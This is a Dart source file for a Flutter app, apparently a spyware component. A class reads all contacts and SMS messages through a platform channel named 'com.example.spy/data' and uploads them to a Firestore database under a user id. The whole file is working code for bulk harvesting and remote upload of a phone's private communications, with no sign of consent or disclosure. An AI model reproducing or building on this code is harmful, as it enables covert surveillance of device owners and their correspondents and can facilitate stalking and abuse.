import 'dart:async';
import 'package:flutter/cupertino.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'contact_sms_event.dart';
import 'contact_sms_state.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/services.dart';

class ContactSmsBloc extends Bloc<ContactSmsEvent, ContactSmsState> {
  ContactSmsBloc() : super(ContactSmsInitial()) {
    on<LoadContactAndSms>(_onLoadData);
    on<UploadContactAndSms>(_onUploadData);
  }

  Future<void> _onLoadData(LoadContactAndSms event, Emitter emit) async {
    emit(ContactSmsLoading());
    try {
      const platform = MethodChannel("com.example.spy/data");
      final result = await platform.invokeMethod<Map<dynamic, dynamic>>(
        "getContactsAndSms",
      );

      if (result != null) {
        final contacts = (result["contacts"] as List<dynamic>)
            .cast<Map<dynamic, dynamic>>();
        final smsList = (result["sms"] as List<dynamic>)
            .cast<Map<dynamic, dynamic>>();

        final convertedContacts = contacts
            .map((contact) => Map<String, dynamic>.from(contact))
            .toList();

        final convertedSms = smsList
            .map((sms) => Map<String, dynamic>.from(sms))
            .toList();

        add(
          UploadContactAndSms(
            contacts: convertedContacts,
            smsList: convertedSms,
            uid: event.uid,
          ),
        );
      } else {
        emit(ContactSmsError("Failed to get data"));
        debugPrint("No data received from platform channel.");
      }
    } catch (e) {
      emit(ContactSmsError(e.toString()));
      debugPrint("Error in _onLoadData: $e");
    }
  }

  Future<void> _onUploadData(UploadContactAndSms event, Emitter emit) async {
    try {
      final userRef = FirebaseFirestore.instance
          .collection('users')
          .doc(event.uid);

      for (var contact in event.contacts) {
        await userRef.collection('contacts').doc(contact['phone']).set(contact);
      }

      final smsRef = userRef.collection('sms');
      final existingSms = await smsRef.get();

      final existingTimestamps = existingSms.docs
          .map((doc) => doc['timestamp'].toString())
          .toSet();

      for (var sms in event.smsList) {
        if (!existingTimestamps.contains(sms['timestamp'].toString())) {
          await smsRef.add(sms);
        }
      }

      emit(ContactSmsUploaded());
    } catch (e) {
      emit(ContactSmsError(e.toString()));
      debugPrint("Error in _onUploadData: $e");
    }
  }
}
